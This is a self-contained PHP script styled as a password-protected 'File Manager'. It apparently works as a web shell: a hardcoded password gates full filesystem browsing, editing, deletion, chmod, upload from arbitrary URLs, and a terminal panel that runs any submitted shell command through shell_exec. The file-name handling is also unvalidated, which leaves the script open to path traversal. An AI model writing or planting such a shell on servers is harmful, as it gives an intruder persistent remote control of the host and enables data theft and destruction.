<?php
$password = 'admin321';
session_start();

if(isset($_POST['password'])){
    if($_POST['password'] === $password){
        $_SESSION['logged_in'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = 'Wrong Password!';
    }
}

if(!isset($_SESSION['logged_in'])){
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login - File Manager</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 flex items-center justify-center p-4">
<div class="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-md animate-fade-in">
<div class="text-center mb-8">
<div class="text-6xl mb-4">🔐</div>
<h1 class="text-3xl font-bold text-gray-800 mb-2">File Manager</h1>
<p class="text-gray-500">Enter your password to continue</p>
</div>
<?php if(isset($login_error)): ?>
<div class="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-xl mb-4 animate-shake">
<?php echo htmlspecialchars($login_error); ?>
</div>
<?php endif; ?>
<form method="POST" class="space-y-4">
<div>
<label class="block text-sm font-medium text-gray-700 mb-2">Password</label>
<input type="password" name="password" required autofocus
       class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50 transition duration-200">
</div>
<button type="submit" 
        class="w-full bg-gradient-to-r from-gray-800 to-black text-white font-semibold py-3 rounded-xl hover:from-gray-900 hover:to-gray-950 transform hover:scale-[1.02] transition duration-200 shadow-lg">
Login
</button>
</form>
</div>
</body>
</html>
<?php
exit;
}

// Handle logout
if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

// ---------------------------- FILE MANAGER ---------------------------
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if($dir === false) $dir = getcwd();

if(isset($_POST['action'])){
    switch($_POST['action']){
        case "create_file":
            file_put_contents($dir."/".$_POST['filename'],"");
            break;
        case "create_folder":
            mkdir($dir."/".$_POST['foldername']);
            break;
        case "delete":
            $target = $dir."/".$_POST['target'];
            if(is_dir($target)){
                rmdir($target);
            } else {
                unlink($target);
            }
            break;
        case "rename":
            rename($dir."/".$_POST['old'], $dir."/".$_POST['new']);
            break;
        case "chmod":
            chmod($dir."/".$_POST['target'], octdec($_POST['perm']));
            break;
        case "upload_file":
            if(isset($_FILES['file'])){
                move_uploaded_file($_FILES['file']['tmp_name'], $dir."/".$_FILES['file']['name']);
            }
            break;
        case "upload_url":
            $content = file_get_contents($_POST['file_url']);
            file_put_contents($dir."/".$_POST['file_url_name'],$content);
            break;
        case "edit_file":
            file_put_contents($dir."/".$_POST['file_name'], $_POST['file_content']);
            break;
        case "terminal":
            $command = $_POST['command'];
            $output = shell_exec("cd ".escapeshellarg($dir)." && ".$command." 2>&1");
            break;
    }
}

function human_filesize($bytes, $decimals = 2) {
    $size = ['B','KB','MB','GB','TB','PB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$size[$factor];
}

function breadcrumbs($path){
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $crumbs = [];
    $accum = '';
    foreach($parts as $part){
        if($part === '') continue;
        $accum .= '/'.$part;
        $crumbs[] = "<a href='?dir=".urlencode($accum)."' class='hover:text-gray-900 hover:underline'>".htmlspecialchars($part)."</a>";
    }
    return implode(" <span class='text-gray-400'>/</span> ", $crumbs);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 p-4">

<div class="max-w-7xl mx-auto">
<!-- Header -->
<div class="bg-white rounded-2xl shadow-xl mb-6 overflow-hidden">
<div class="bg-gradient-to-r from-gray-900 to-black px-6 py-6 flex items-center justify-between">
<div class="flex items-center space-x-3">
<span class="text-4xl">📁</span>
<h1 class="text-2xl font-bold text-white">File Manager</h1>
</div>
<a href="?logout=1" class="bg-white/20 hover:bg-white/30 text-white px-6 py-2 rounded-xl font-medium transition duration-200 backdrop-blur-sm flex items-center space-x-2">
<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path>
</svg>
<span>Logout</span>
</a>
</div>

<!-- Breadcrumb -->
<div class="px-6 py-4 bg-gray-50 border-b">
<div class="flex items-center space-x-2 text-sm text-gray-600">
<span class="font-semibold">📍 Current Path:</span>
<div class="flex-1"><?php echo breadcrumbs($dir); ?></div>
</div>
</div>
</div>

<!-- Files Table -->
<div class="bg-white rounded-2xl shadow-xl mb-6 overflow-hidden">
<div class="px-6 py-4 border-b bg-gray-50">
<h2 class="text-xl font-bold text-gray-800 flex items-center space-x-2">
<span>📂</span>
<span>Files & Directories</span>
</h2>
</div>
<div class="overflow-x-auto">
<table class="w-full">
<thead class="bg-gradient-to-r from-gray-900 to-black text-white">
<tr>
<th class="px-6 py-4 text-left font-semibold">Name</th>
<th class="px-6 py-4 text-left font-semibold">Size</th>
<th class="px-6 py-4 text-left font-semibold">Actions</th>
</tr>
</thead>
<tbody class="divide-y divide-gray-100">
<?php
$files = scandir($dir);
if($dir != DIRECTORY_SEPARATOR){
    echo "<tr class='hover:bg-gray-50'><td colspan='3' class='px-6 py-4'><a href='?dir=".urlencode(dirname($dir))."' class='text-gray-900 hover:text-black font-medium'>📁 ..</a></td></tr>";
}
foreach($files as $file){
    if($file=='.' || $file=='..') continue;
    $full = $dir."/".$file;
    $size = is_dir($full) ? '—' : human_filesize(filesize($full));
    echo "<tr class='hover:bg-gray-50 transition'>";
    echo "<td class='px-6 py-4'>";
    if(is_dir($full)){
        echo "<a href='?dir=".urlencode($full)."' class='text-gray-900 hover:text-black font-medium flex items-center space-x-2'><span>📁</span><span>".htmlspecialchars($file)."</span></a>";
    } else {
        echo "<div class='flex items-center space-x-2 text-gray-700'><span>📄</span><span>".htmlspecialchars($file)."</span></div>";
    }
    echo "</td>";
    echo "<td class='px-6 py-4 text-gray-600'>".$size."</td>";
    echo "<td class='px-6 py-4'>";
    echo "<div class='flex items-center space-x-2'>";
    if(is_dir($full)){
        echo "<a href='?dir=".urlencode($full)."' class='bg-gray-200 text-gray-900 px-3 py-1 rounded-lg text-sm font-medium hover:bg-gray-300 transition'>Open</a>";
    }
    if(is_file($full)){
        echo "<a href='?dir=".urlencode($dir)."&edit=".urlencode($file)."' class='bg-green-100 text-green-700 px-3 py-1 rounded-lg text-sm font-medium hover:bg-green-200 transition'>Edit</a>";
        echo "<a href='".htmlspecialchars($full)."' download class='bg-blue-100 text-blue-700 px-3 py-1 rounded-lg text-sm font-medium hover:bg-blue-200 transition'>Download</a>";
    }
    echo "<form method='POST' class='inline' onsubmit='return confirm(\"Delete this item?\")'>";
    echo "<input type='hidden' name='action' value='delete'>";
    echo "<input type='hidden' name='target' value='".htmlspecialchars($file)."'>";
    echo "<button type='submit' class='bg-red-100 text-red-700 px-3 py-1 rounded-lg text-sm font-medium hover:bg-red-200 transition'>Delete</button>";
    echo "</form>";
    echo "</div>";
    echo "<div class='flex items-center space-x-2 mt-2'>";
    echo "<form method='POST' class='flex items-center space-x-1 w-full'>";
    echo "<input type='hidden' name='action' value='rename'>";
    echo "<input type='hidden' name='old' value='".htmlspecialchars($file)."'>";
    echo "<input type='text' name='new' placeholder='New name' class='flex-1 border border-gray-300 rounded-lg px-2 py-1 text-sm focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50'>";
    echo "<button type='submit' class='bg-yellow-100 text-yellow-700 px-3 py-1 rounded-lg text-sm font-medium hover:bg-yellow-200 transition whitespace-nowrap'>Rename</button>";
    echo "</form>";
    echo "</div>";
    echo "</td>";
    echo "</tr>";
}
?>
</tbody>
</table>
</div>
</div>

<!-- Quick Actions -->
<div class="bg-white rounded-2xl shadow-xl mb-6 overflow-hidden">
<div class="px-6 py-4 border-b bg-gray-50">
<h2 class="text-xl font-bold text-gray-800 flex items-center space-x-2">
<span>⚡</span>
<span>Quick Actions</span>
</h2>
</div>
<div class="p-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
<!-- Create Folder -->
<div class="bg-gradient-to-br from-gray-100 to-gray-200 p-6 rounded-xl border border-gray-300">
<h3 class="font-bold text-gray-800 mb-3 flex items-center space-x-2">
<span>📁</span>
<span>Create Folder</span>
</h3>
<form method="POST" class="space-y-2">
<input type="hidden" name="action" value="create_folder">
<input type="text" name="foldername" placeholder="Folder name" required
       class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50 text-sm">
<button type="submit" 
        class="w-full bg-gradient-to-r from-gray-800 to-black text-white font-medium py-2 rounded-lg hover:from-gray-900 hover:to-gray-950 transition text-sm">
Create
</button>
</form>
</div>

<!-- Create File -->
<div class="bg-gradient-to-br from-gray-100 to-gray-200 p-6 rounded-xl border border-gray-300">
<h3 class="font-bold text-gray-800 mb-3 flex items-center space-x-2">
<span>📄</span>
<span>Create File</span>
</h3>
<form method="POST" class="space-y-2">
<input type="hidden" name="action" value="create_file">
<input type="text" name="filename" placeholder="File name" required
       class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50 text-sm">
<button type="submit" 
        class="w-full bg-gradient-to-r from-gray-800 to-black text-white font-medium py-2 rounded-lg hover:from-gray-900 hover:to-gray-950 transition text-sm">
Create
</button>
</form>
</div>

<!-- Upload File -->
<div class="bg-gradient-to-br from-gray-100 to-gray-200 p-6 rounded-xl border border-gray-300">
<h3 class="font-bold text-gray-800 mb-3 flex items-center space-x-2">
<span>📤</span>
<span>Upload File</span>
</h3>
<form method="POST" enctype="multipart/form-data" class="space-y-2">
<input type="hidden" name="action" value="upload_file">
<input type="file" name="file" required
       class="w-full text-sm text-gray-600 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-gray-200 file:text-gray-800 hover:file:bg-gray-300">
<button type="submit" 
        class="w-full bg-gradient-to-r from-gray-800 to-black text-white font-medium py-2 rounded-lg hover:from-gray-900 hover:to-gray-950 transition text-sm">
Upload
</button>
</form>
</div>

<!-- Upload from URL -->
<div class="bg-gradient-to-br from-gray-100 to-gray-200 p-6 rounded-xl border border-gray-300">
<h3 class="font-bold text-gray-800 mb-3 flex items-center space-x-2">
<span>🌐</span>
<span>From URL</span>
</h3>
<form method="POST" class="space-y-2">
<input type="hidden" name="action" value="upload_url">
<input type="text" name="file_url" placeholder="File URL" required
       class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50 text-sm">
<input type="text" name="file_url_name" placeholder="Save as" required
       class="w-full px-3 py-2 border border-gray-300 rounded-lg focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50 text-sm">
<button type="submit" 
        class="w-full bg-gradient-to-r from-gray-800 to-black text-white font-medium py-2 rounded-lg hover:from-gray-900 hover:to-gray-950 transition text-sm">
Upload
</button>
</form>
</div>
</div>
</div>

<?php if(isset($_GET['edit'])){ ?>
<?php
$edit_file = $dir."/".$_GET['edit'];
if(is_file($edit_file)){
    $content = htmlspecialchars(file_get_contents($edit_file));
?>
<!-- File Editor -->
<div class="bg-white rounded-2xl shadow-xl mb-6 overflow-hidden">
<div class="px-6 py-4 border-b bg-gray-50">
<h2 class="text-xl font-bold text-gray-800 flex items-center space-x-2">
<span>✏️</span>
<span>Editing: <?php echo htmlspecialchars($_GET['edit']); ?></span>
</h2>
</div>
<div class="p-6">
<form method="POST" class="space-y-4">
<input type="hidden" name="action" value="edit_file">
<input type="hidden" name="file_name" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
<textarea name="file_content" rows="20"
          class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50 font-mono text-sm"><?php echo $content; ?></textarea>
<div class="flex space-x-3">
<button type="submit" 
        class="bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold px-6 py-3 rounded-xl hover:from-green-700 hover:to-emerald-700 transition">
💾 Save Changes
</button>
<a href="?dir=<?php echo urlencode($dir); ?>" 
   class="bg-gray-500 text-white font-semibold px-6 py-3 rounded-xl hover:bg-gray-600 transition">
Cancel
</a>
</div>
</form>
</div>
</div>
<?php }} ?>

<!-- Terminal -->
<div class="bg-white rounded-2xl shadow-xl mb-6 overflow-hidden">
<div class="px-6 py-4 border-b bg-gray-50">
<h2 class="text-xl font-bold text-gray-800 flex items-center space-x-2">
<span>💻</span>
<span>Terminal</span>
</h2>
</div>
<div class="p-6">
<form method="POST" class="space-y-4">
<input type="hidden" name="action" value="terminal">
<input type="text" name="command" placeholder="Enter command (e.g., ls -la, pwd, cat file.txt)" required
       class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50">
<button type="submit" 
        class="bg-gradient-to-r from-gray-800 to-gray-900 text-white font-semibold px-6 py-3 rounded-xl hover:from-gray-900 hover:to-black transition">
▶️ Run Command
</button>
</form>
<div class="mt-4 bg-gray-900 text-green-400 p-4 rounded-xl font-mono text-sm min-h-[100px] max-h-[400px] overflow-auto">
<pre class="whitespace-pre-wrap"><?php if(isset($output)) echo htmlspecialchars($output); else echo "$ Command output will appear here..."; ?></pre>
</div>
</div>
</div>

<!-- Change Permissions -->
<div class="bg-white rounded-2xl shadow-xl mb-6 overflow-hidden">
<div class="px-6 py-4 border-b bg-gray-50">
<h2 class="text-xl font-bold text-gray-800 flex items-center space-x-2">
<span>🔐</span>
<span>Change Permissions</span>
</h2>
</div>
<div class="p-6">
<form method="POST" class="flex flex-col sm:flex-row gap-3">
<input type="hidden" name="action" value="chmod">
<input type="text" name="target" placeholder="File/Folder name" required
       class="flex-1 px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50">
<input type="text" name="perm" placeholder="Permission (e.g. 0755)" required
       class="flex-1 px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-gray-900 focus:ring focus:ring-gray-300 focus:ring-opacity-50">
<button type="submit" 
        class="bg-gradient-to-r from-orange-600 to-red-600 text-white font-semibold px-6 py-3 rounded-xl hover:from-orange-700 hover:to-red-700 transition whitespace-nowrap">
Change Permission
</button>
</form>
</div>
</div>

</div>

</body>
</html>
